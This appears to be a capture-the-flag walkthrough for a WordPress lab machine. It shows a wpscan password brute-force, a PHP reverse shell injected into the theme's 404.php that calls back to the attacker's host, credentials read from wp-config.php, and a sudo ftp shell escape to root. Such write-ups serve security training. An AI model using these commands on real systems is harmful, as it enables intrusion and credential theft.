# user.txt

webserver with `wordpress` setup  
/hidden showed three usernames - C0ldd - Hugo - Philip  
use wpscan to crack the password of c0ldd
`wpscan --url http://10.10.171.103 -P /usr/share/wordlists/rockyou.txt -U c0ldd`   
`Username: C0ldd, Password: 9876543210`  


appearance -> editor -> 404.php  
`<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<your-ip-address>/1234 0>&1'");?>`  
http://ip/?p=404.php  && `nc -lvp 1234`  
  
stabilize shell  
`python3 -c 'import pty; pty.spawn("/bin/bash")'`  
`export TERM=xterm`  
Ctrl + Z  
`stty raw -echo; fg`   (from local terminal)  
<enter>  
     
`cat wp-config.php` to see the wordpress config file  
`Username: C0ldd, Password: cybersecurity` 

<details>
<summary>flag</summary>
user.txt -- RmVsaWNpZGFkZXMsIHByaW1lciBuaXZlbCBjb25zZWd1aWRvIQ==
</details>

# root.txt  

`sudo -l` to find all programms that can be run as root   
`sudo ftp`  
`!bin/sh`  
`find / -iname root.txt 2</dev/null`  

<details>
<summary>flag</summary>
root.txt -- wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE=
</details>